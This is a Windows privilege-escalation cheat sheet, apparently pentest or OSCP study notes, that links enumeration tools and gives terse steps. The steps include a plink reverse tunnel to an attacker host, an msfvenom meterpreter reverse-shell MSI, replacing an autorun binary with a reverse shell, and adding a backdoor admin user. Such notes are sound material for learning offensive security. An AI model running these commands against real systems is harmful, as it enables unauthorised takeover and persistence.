# Privilege Escalation Tips for Windows

## Automated Tools
1. winPEAS.exe (Executable) - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
2. Sherlock.ps1 (PowerShell) - https://github.com/rasta-mouse/Sherlock
3. PowerUp.ps1 (PowerShell) - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
4. jaws-enum.ps1 (PowerShell) - https://github.com/411Hall/JAWS
5. windows-exploit-suggester.py - https://github.com/AonCyberLabs/Windows-Exploit-Suggester

## Summary of Possible Windows Priv Esc
1. Kernel Exploits
2. Stored Passwords 
3. Impersonation and Potato attacks
4. Escalation via Runas
5. Escalation via Windows Subsystem for Linux
6. Escalation via Autorun
7. Escalation via AlwaysInstallElevated

## Tips

- https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

## Stored Passwords

1. Get the password; could be a WinLogon or AutoLogon password
2. Download plink.exe - https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html (plink.exe (a command-line interface to the PuTTY back ends)
3. Transfer plink.exe to the exploited machine
4. Set `PermitRootLogin` to `yes` on Kali - `sudo vi /etc/ssh/sshd_config`
5. `sudo service ssh restart`
6. On exploited machine, run `plink.exe -l [KALI USER] -pw [KALI's PW] -R 445:127.0.0.1:445 [KALI's IP ADDRESS]
7. `winexe -U Administrator%[ENTER STORED PW]` //127.0.0.1 "cmd.exe"

## Escalation via Windows Subsystem for Linux

1. Locate the bash.exe and wsl.exe - `where /R C:\Windows bash.exe` `where /R C:\Windows wsl.exe`
2. Run bash.exe on WSL in the Windows machine 
3. In the WSL bash.exe, run `python -c "import pty;pty.spawn('/bin/bash')"`
4. Get credentials here?

## Token Impersonation

- Juicy Potato - https://github.com/ohpe/juicy-potato (SeAssignPrimaryToken/SeImpersonatePrivilege is set to true?)

## Escalation via Runas

- `cmdkey /list`
- `C:\Windows\System32\runas.exe /user:ACCESS:Administrator [COMMANDS TO RUN AS ADMIN]`

## Escalation via Autorun

- Look for the program exe that is "autorun"
- Use accesschk64.exe to check if the program exe is writable by everyone
- Create a Msfvenom reverse shell payload that will replace the original program
- When the admin user logins and trigger the autorun program, a reverse shell will be generated

## Escalation via AlwaysInstallElevated

- Run this command to check - `reg query HKLM\Software\Policies\Microsoft\Windows\Installer`
- If the value is 1, AlwaysInstallElevated is on!
- Generate the Msfvenom reverse shell payload e.g. `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi`
- Copy the generated file to the vuln VM and run it

OR 

- Import `. .\PowerUp.ps1` and run `Write-UserAddMSI`
- Add the backdoor admin user via the malicious MSI file
